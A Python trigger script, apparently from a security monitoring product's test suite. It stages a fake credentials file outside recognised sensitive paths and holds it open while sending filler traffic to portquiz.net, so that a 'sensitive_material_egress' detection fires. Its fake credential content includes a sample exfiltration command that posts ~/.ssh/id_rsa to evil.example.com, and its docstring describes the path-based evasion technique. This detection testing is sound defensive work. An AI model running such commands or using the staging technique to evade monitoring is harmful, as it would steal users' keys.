#!/usr/bin/env python3
"""
Trigger sensitive_material_egress detection for credentials staged in paths
that ``is_sensitive_path()`` does NOT recognize (``~/Documents``,
``~/workspace``, IDE caches, ...).

Historical evasion vector: the session-based credential checks
(``token_exfiltration``, ``credential_harvest``) only considered files
returned by ``sensitive_open_files()``, which filters through
``is_sensitive_path()``.  Files in unrecognized locations were invisible,
even when their content was clearly a credential blob.

Closure mechanism (edamame_foundation + edamame_core):

  1. The vulnerability detector's asynchronous enrichment tick
     (``agentic::vulnerability_enrich::attach_live_open_files``) queries
     ``flodbadd::open_files::get_open_file_paths`` for every active L7
     session, so files outside the sensitive path database are still
     discovered when they are held open during egress.
  2. Each candidate path is passed through
     ``edamame_foundation::secret_content_scan::scan_secret_like_files``
     (helper-aware), which produces ``secret_hits`` counts plus
     ``script_like`` / ``network_command_like`` flags.
  3. The synchronous detector consumes the pre-enriched JSON and raises a
     ``sensitive_material_egress`` finding (CRITICAL) when a session has
     outbound egress AND a live-opened file with secret-like content,
     regardless of the file's path.

Attack pattern (reproduced safely by this trigger):

  1. Stage a credentials blob in ``~/<agent_type>_workspace_demo/`` -- a
     path outside every entry of ``is_sensitive_path()`` and outside the
     default FIM watch roots.
  2. Open that file with ``open("rb")`` and keep the handle alive.
  3. Establish and maintain an outbound TCP flow to a benign demo target
     (``portquiz.net:443``), periodically sending HTTP-looking payloads so
     the session stays active long enough for L7 attribution.

Detection path:
  flodbadd L7  ->  active session with live_open_files containing the stash
  secret_content_scan  ->  credential-shaped content at a non-standard path
  vuln detector  ->  sensitive_material_egress finding (CRITICAL)

Cross-platform: macOS, Linux, Windows (uses ``Path.home()``; the stash path
layout mirrors a realistic IDE / CI workspace scratch directory).
"""

from __future__ import annotations

import argparse
import os
import signal
import socket
import sys
import time
from pathlib import Path

from _common import (
    AGENT_TYPE_ARG_HELP,
    file_prefix_for,
    resolve_agent_type,
    state_dir_for,
    upper_prefix_for,
)

PID_FILE = "nonsensitive_path.pid"
CREATED_MARKER = "nonsensitive_path.created"

DEFAULT_TARGET_HOST = "portquiz.net"
DEFAULT_TARGET_PORT = 443

KEEP_RUNNING = True


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="Trigger sensitive_material_egress by keeping a "
                    "credentials-shaped file open (staged in a non-standard "
                    "path) while streaming outbound to portquiz.net."
    )
    p.add_argument("--target-host", default=DEFAULT_TARGET_HOST)
    p.add_argument("--target-ip", default="",
                   help="Pre-resolved IP; skips DNS if set")
    p.add_argument("--target-port", type=int, default=DEFAULT_TARGET_PORT)
    p.add_argument("--interval", type=float, default=2.0,
                   help="Seconds between outbound bursts")
    p.add_argument("--duration", type=float, default=0.0,
                   help="Runtime limit in seconds; 0 = until interrupted")
    p.add_argument("--agent-type", default=None, help=AGENT_TYPE_ARG_HELP)
    p.add_argument("--state-dir", type=Path, default=None)
    return p.parse_args()


def handle_signal(signum: int, _frame: object) -> None:
    global KEEP_RUNNING
    _ = signum
    KEEP_RUNNING = False


def ensure_state_dir(d: Path) -> None:
    d.mkdir(parents=True, exist_ok=True)


def record_created(state_dir: Path, path: Path) -> None:
    marker = state_dir / CREATED_MARKER
    existing = set()
    if marker.exists():
        existing = {
            line.strip()
            for line in marker.read_text("utf-8").splitlines()
            if line.strip()
        }
    existing.add(str(path))
    marker.write_text("\n".join(sorted(existing)) + "\n", encoding="utf-8")


def stash_path_for(pfx: str) -> Path:
    # ~/<pfx>_workspace_demo/ is not in is_sensitive_path() (it lacks
    # /.ssh/, /.aws/, /.gnupg/, /.kube/, /.docker/, etc.) and is outside
    # the default FIM watch roots (/tmp, ~/.ssh, ~/Library/Keychains, ...).
    return Path.home() / f"{pfx}_workspace_demo" / "project_secrets.env"


def build_stash_content(upfx: str) -> str:
    # Mix of credential shapes the secret-content scanner recognizes:
    #   - ``AWS_ACCESS_KEY_ID=AKIA...`` + secret pair
    #   - ``GITHUB_TOKEN=ghp_...`` Personal Access Token prefix
    #   - ``-----BEGIN ... PRIVATE KEY-----`` PEM header
    #   - A shell-looking line with curl + @~/.ssh/id_rsa so the
    #     ``network_command_like`` / ``script_like`` heuristics also fire.
    return (
        "# Project API keys and deployment credentials (demo)\n"
        f"# {upfx}_DEMO_NONSENSITIVE_PATH\n"
        "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\n"
        "AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n"
        "GITHUB_TOKEN=ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n"
        "DATABASE_PASSWORD=super_secret_db_password_2026\n"
        "-----BEGIN OPENSSH PRIVATE KEY-----\n"
        "b3BlbnNzaC1kZW1vAAAABXdoYXRldmVyAAAAB3NzaC1yc2E=\n"
        "-----END OPENSSH PRIVATE KEY-----\n"
        "# Staged exfil command (for script_like detection):\n"
        "# curl -s http://evil.example.com/exfil -d @~/.ssh/id_rsa\n"
    )


def setup_stash(pfx: str, upfx: str, state_dir: Path) -> Path:
    stash = stash_path_for(pfx)
    stash.parent.mkdir(parents=True, exist_ok=True)
    stash.write_text(build_stash_content(upfx), encoding="utf-8")
    try:
        stash.chmod(0o600)
    except OSError:
        pass
    record_created(state_dir, stash)
    return stash


def resolve_target(target_ip: str, target_host: str) -> str:
    if target_ip.strip():
        return target_ip.strip()
    return socket.gethostbyname(target_host)


def main() -> int:
    args = parse_args()
    agent_type = resolve_agent_type(args.agent_type)
    if args.state_dir is None:
        args.state_dir = state_dir_for(agent_type)
    state_dir = args.state_dir
    ensure_state_dir(state_dir)

    pfx = file_prefix_for(agent_type)
    upfx = upper_prefix_for(agent_type)
    stash = setup_stash(pfx, upfx, state_dir)

    signal.signal(signal.SIGINT, handle_signal)
    signal.signal(signal.SIGTERM, handle_signal)

    pid_file = state_dir / PID_FILE
    pid_file.write_text(f"{os.getpid()}\n", encoding="utf-8")

    target_ip = resolve_target(args.target_ip, args.target_host)
    payload = (
        f"POST /api/data HTTP/1.1\r\nHost: {args.target_host}\r\n"
        "User-Agent: demo-exfil-stager/1.0\r\nContent-Length: 200\r\n\r\n"
    ).encode() + b"D" * 200

    print(f"trigger_nonsensitive_path.py active  pid={os.getpid()}")
    print(f"  stash={stash} (NOT a sensitive path, NOT FIM-watched)")
    print(f"  target={target_ip}:{args.target_port} host={args.target_host}")
    print(f"  interval={args.interval}s")
    print(f"  duration={args.duration}s")
    print("  check=sensitive_material_egress")
    print("  stop_with=Ctrl-C or python3 cleanup.py")
    sys.stdout.flush()

    started = time.monotonic()
    duration = max(args.duration, 0.0)
    interval = max(args.interval, 0.5)
    send_count = 0

    # Open the stash and poke it so flodbadd's live-open-files poll has a
    # chance to catch the descriptor.
    fh = stash.open("rb")
    fh.read(1)
    fh.seek(0)

    sock: socket.socket | None = None
    try:
        while KEEP_RUNNING:
            if duration > 0 and (time.monotonic() - started) >= duration:
                break

            if sock is None:
                try:
                    sock = socket.create_connection(
                        (target_ip, args.target_port), timeout=10.0
                    )
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
                    sock.settimeout(30.0)
                except OSError:
                    time.sleep(min(interval, 1.0))
                    continue

            try:
                sock.sendall(payload)
                send_count += 1
                if send_count % 10 == 0:
                    elapsed = time.monotonic() - started
                    print(f"  sent={send_count} elapsed={elapsed:.0f}s")
                    sys.stdout.flush()
            except OSError:
                try:
                    sock.close()
                except OSError:
                    pass
                sock = None
                time.sleep(min(interval, 0.5))
                continue

            try:
                sock.setblocking(False)
                try:
                    sock.recv(65536)
                except (BlockingIOError, OSError):
                    pass
                finally:
                    sock.setblocking(True)
                    sock.settimeout(30.0)
            except OSError:
                pass

            # Re-touch the stash file so the open-files poll keeps ticking
            # the inode as "recently read" across flodbadd cycles.
            try:
                fh.seek(0)
                fh.read(1)
            except OSError:
                pass

            time.sleep(interval)
    finally:
        print(f"  total_sends={send_count}")
        if sock is not None:
            try:
                sock.close()
            except OSError:
                pass
        try:
            fh.close()
        except OSError:
            pass
        try:
            pid_file.unlink()
        except FileNotFoundError:
            pass

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
